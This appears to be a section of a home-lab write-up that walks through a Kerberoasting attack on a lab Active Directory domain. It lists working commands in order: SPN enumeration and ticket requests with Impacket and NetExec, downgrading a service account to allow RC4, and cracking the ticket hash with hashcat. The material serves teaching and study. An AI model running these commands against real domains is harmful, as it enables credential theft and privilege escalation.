# Attack Simulation

## Overview

This section documents the offensive execution of Kerberoasting within the Active Directory lab environment. It covers the attack methodology, tools used, and the sequence of actions taken to obtain and crack an encrypted Kerberos service-ticket token.

The objective is to demonstrate how an attacker can abuse an existing Windows functionality to obtain privileged credentials.

---

## 1. Use Impacket's 

The attacker controls the domain account *fernandesb* and subsequently has access to the domain computer Desktop-1 on IP address 192.168.4.11. Using these details and Impacket's tool **GetUserSPNs.py** proceed as below:

---
### Identify SPN-associated accounts to target

```bash
GetUserSPNs.py mydomain.local/fernandesb:Password@123 -dc-ip 192.168.4.10
```

---

### Request service ticket

```bash
GetUserSPNs.py mydomain.local/fernandesb:Password@123 -dc-ip 192.168.4.10 -request
```

---

### Kerberoasting using NetExec

```bash
nxc ldap 192.168.4.10 -u fernandesb -p Password@123 --kerberoasting kerberos_service_ticket.txt
```

---

### Confirm the encryption types configured for `sql_service` account

```ps1
Get-ADUser sql_service -Properties msDS-SupportedEncryptionTypes | Select-Object SamAccountName, msDS-SupportedEncryptionTypes
```

---

### Configure the encryption type of the `sql_service` to include RC4

```ps1
Set-ADUser sql_service -Replace @{
    'msDS-SupportedEncryptionTypes' = 28
}
```

| Encryption | Code | Code in Hex |
|-----|-----|-----|
| RC4 | 4 | `0x04` |
| AES128 | 8 | `0x08` |
| AES256 | 16 | `0x10` |
| AES128 + AES256 | 24 | `0x18` |
| RC4 + AES128 + AES256 | 28 | `0x1C` |
| Full Modern Security Standards | 60 | `0x3C` |

---

### Confirm Hashcat Kerberos modes

```bash
hashcat -hh | grep Kerberos
```
---

### Crack the Kerberos service ticket

```bash
hashcat -m 19700 Kerberos_service_ticket_hash.txt rockyou.txt
```

---

